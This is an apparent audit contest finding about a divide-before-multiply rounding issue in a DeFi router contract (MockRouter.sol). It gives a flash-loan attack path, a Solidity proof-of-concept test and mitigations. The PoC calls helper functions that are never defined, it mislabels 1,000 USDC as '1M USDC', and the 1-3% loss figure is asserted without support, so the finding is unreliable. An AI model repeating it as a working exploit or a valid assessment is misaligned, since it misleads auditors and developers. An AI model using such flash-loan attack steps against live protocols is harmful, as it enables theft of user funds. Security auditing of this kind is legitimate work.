# Attackers will extract value through flash loan precision manipulation

### Summary

The divide-before-multiply pattern will cause significant value extraction for users as attackers will use flash loans to manipulate precision loss and extract value through arbitrage.

### Root Cause

In src/MockRouter.sol (lines 98-103) (https://github.com/sherlock-audit/2024-12-plaza-finance/blob/main/plaza-evm/src/MockRouter.sol#L98-L103), the divide-before-multiply pattern enables flash loan attacks due to truncation manipulation::
```solidity
scaledDepositAmount = depositAmount / (10 ** (usdcDecimals - oracleDecimals))
reserveAmount = (scaledDepositAmount * (10 ** IERC20(reserveToken).safeDecimals())) / ethPrice
```

This sequence of operations leads to loss of precision due to integer division truncation.


### Internal Pre-conditions

1. Attacker needs access to flash loan liquidity
2. Token pair must have enough liquidity for the attack size
3. Price impact from trades must not exceed potential precision loss gains

### External Pre-conditions

1. Flash loan provider must have sufficient liquidity
2. Arbitrage opportunities must exist between this DEX and others

### Attack Path

1. Attacker takes flash loan of target token
2. Attacker performs multiple swaps with specific amounts to maximize truncation
3. Attacker arbitrages against other DEXes to capture the price differences
4. Attacker repays flash loan and keeps profit from precision loss

### Impact

The protocol users suffer an approximate loss of 1-3% per manipulated trade. The attacker gains this entire amount minus flash loan fees and gas costs.

### PoC

```solidity
contract FlashLoanPrecisionAttack is Test {
    MockRouter router;
    MockERC20 usdc;
    MockERC20 reserveToken;
    MockLendingPool lendingPool;
    
    function setUp() public {
        usdc = new MockERC20("USDC", "USDC", 6);
        reserveToken = new MockERC20("RT", "RT", 18);
        router = new MockRouter();
        lendingPool = new MockLendingPool();
    }
    
    function testFlashLoanAttack() public {
        // Setup initial states
        uint256 flashLoanAmount = 1000000000; // 1M USDC
        uint256 initialBalance = usdc.balanceOf(address(this));
        
        // Execute flash loan attack
        lendingPool.flashLoan(
            address(this),
            address(usdc),
            flashLoanAmount,
            abi.encodeWithSignature("executeAttack()")
        );
        
        // Verify profit
        uint256 finalBalance = usdc.balanceOf(address(this));
        uint256 profit = finalBalance - initialBalance;
        assertTrue(profit > 0);
        console.log("Attack profit:", profit);
    }
    
    function executeAttack() external {
        // Perform multiple precision-loss-maximizing swaps
        uint256[] memory amounts = calculateOptimalAmounts();
        for (uint i = 0; i < amounts.length; i++) {
            router.swapCreate(
                address(usdc),
                address(reserveToken),
                TokenType.ERC20,
                amounts[i],
                0, // min output
                block.timestamp,
                address(this)
            );
        }
        
        // Arbitrage against external DEX
        arbitragePositions();
    }
}
```

### Mitigation

1. Implement price impact checks
2. Add minimum trade size requirements
3. Fix the divide-before-multiply pattern
4. Consider implementing flash loan protection mechanisms
